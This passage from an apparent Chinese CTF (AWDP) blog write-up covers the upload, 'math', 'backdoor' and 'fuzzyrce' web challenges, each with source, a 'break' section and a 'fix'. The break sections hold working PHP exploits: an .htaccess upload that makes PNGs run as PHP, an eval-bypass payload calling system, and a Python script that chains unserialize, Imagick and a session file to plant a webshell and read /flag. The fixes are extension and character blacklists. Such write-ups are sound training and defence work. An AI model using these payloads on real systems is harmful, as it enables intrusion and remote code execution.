class="hljs-number">46036</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: http:<span class="hljs-comment">//182.92.117.61:46036</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1CqD56xsbSxgA2L0</span><br><span class="hljs-comment">Referer: http://182.92.117.61:46036/</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 339</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundary1CqD56xsbSxgA2L0</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="hljs-comment">Content-Type: application/octet-stream</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AddType application/x-httpd-php .png</span><br><span class="hljs-comment">------WebKitFormBoundary1CqD56xsbSxgA2L0</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">上传</span><br><span class="hljs-comment">------WebKitFormBoundary1CqD56xsbSxgA2L0--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>上传png图片🐎<br><img src="/mdimg/awdp1/1717553756293-755c67c8-7db8-4701-8307-0d9a8e5dc6fa.png"></p><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>黑名单加上<code>.htaccess</code>后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="math"><a href="#math" class="headerlink" title="math"></a>math</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h3><p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi=system&amp;cos=cat /f*</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//</span><br>hex2bin<br><span class="hljs-number">5</span>f474554<br>_GET<br><br></code></pre></td></tr></table></figure><p>则<code>$pi=_GET</code><br><code>$$pi=$_GET</code><br><code>($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)=$_GET&#123;pi&#125;($_GET&#123;cos&#125;)</code></p><h3 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h3><p>黑名单加上大{}和$<br><code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;</code>‘, ‘[‘, ‘]‘,’{‘,’}‘,’$‘];`</p><h1 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ERROR);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$argv</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&quot;stdclass&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$do_exec_func</span> = <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;path)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;path;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;__sleep failed...&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<br>                <span class="hljs-variable language_">$this</span>-&gt;do_exec_func &amp;&amp; <br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>, <span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&quot;internal&quot;</span>])<br>            ) &#123;<br>                    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$argv</span> = <span class="hljs-variable language_">$this</span>-&gt;argv;<br>                <span class="hljs-variable">$class</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br><span class="hljs-class">                </span><br><span class="hljs-class">                <span class="hljs-title">new</span> $<span class="hljs-title">class</span>($<span class="hljs-title">argv</span>);</span><br><span class="hljs-class">            &#125;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class">$<span class="hljs-title">cmd</span> = $<span class="hljs-title">_REQUEST</span>[&#x27;<span class="hljs-title">cmd</span>&#x27;];</span><br><span class="hljs-class">$<span class="hljs-title">data</span> = $<span class="hljs-title">_REQUEST</span>[&#x27;<span class="hljs-title">data</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">switch</span> ($<span class="hljs-title">cmd</span>) </span>&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;unserialze&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf /tmp&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h3><p>在<code> call_user_func($this-&gt;class);</code>可以触发无参函数并且要在自带函数里面<br>构造<br><code>cmd=unserialze&amp;data=O:8:&quot;backdoor&quot;:4:&#123;s:4:&quot;path&quot;;s:14:&quot;/var/www/html/&quot;;s:4:&quot;argv&quot;;N;s:5:&quot;class&quot;;s:7:&quot;phpinfo&quot;;s:12:&quot;do_exec_func&quot;;b:1;&#125;</code><br>可以触发phpinfo<br><img src="/mdimg/awdp1/1717570630355-d12caa79-a7e1-4354-9f81-bbe53576e05d.png"><br>要触发<code>__sleep</code>来利用<code>include</code>包含文件<br><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>timeout = <span class="hljs-number">30</span><br><br>host = <span class="hljs-string">&#x27;182.92.117.61&#x27;</span><br>port = <span class="hljs-string">&#x27;48267&#x27;</span><br><br>url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span><br>write_session_payload = <span class="hljs-string">&quot;O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D&quot;</span><br>session_sleep_chain_payload = <span class="hljs-string">&quot;O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm_tmp_file</span>():<br>    headers = &#123;<span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>&#125;<br>    requests.get(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/?cmd=rm&quot;</span>,<br>        headers=headers<br>    )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_session</span>():<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=------------------------c32aaddf3d8fd979&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&quot;--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\&quot;swarm\&quot;; filename=\&quot;swarm.msl\&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\r\n&lt;image&gt;\r\n &lt;read filename=\&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=\&quot; /&gt;\r\n &lt;write filename=\&quot;/tmp/sess_afkl\&quot; /&gt;\r\n&lt;/image&gt;\r\n--------------------------c32aaddf3d8fd979--&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.post(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/?data=O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D&amp;cmd=unserialze&quot;</span>,<br>            headers=headers, data=data<br>        )<br>    <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;afkl&quot;</span>&#125;<br>    headers = &#123;<span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>&#125;<br>    response = requests.get(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/?data=O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D&amp;cmd=unserialze&amp;1=system(&#x27;cat /flag&#x27;);&quot;</span>, <br>        headers=headers, cookies=cookies<br>    )<br>    <span class="hljs-keyword">return</span>  response.text<br><br><span class="hljs-comment"># 主逻辑</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rm_tmp_file()<br>    upload_session()<br><br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(get_flag())<br></code></pre></td></tr></table></figure><h3 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h3><p>直接删除               <code> new $class($argv);</code></p><h1 id="fuzzyrce"><a href="#fuzzyrce" class="headerlink" title="fuzzyrce"></a>fuzzyrce</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;check.php&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$w1key</span>) == <span class="hljs-variable">$w1key</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-variable">$w1key</span> &gt; <span class="hljs-number">999999999</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good&quot;</span>;<br>  &#125; <br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please input a valid number!&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$w1key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$w1key</span>);<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$w1key</span>);<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$w1key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$w1key</span>) 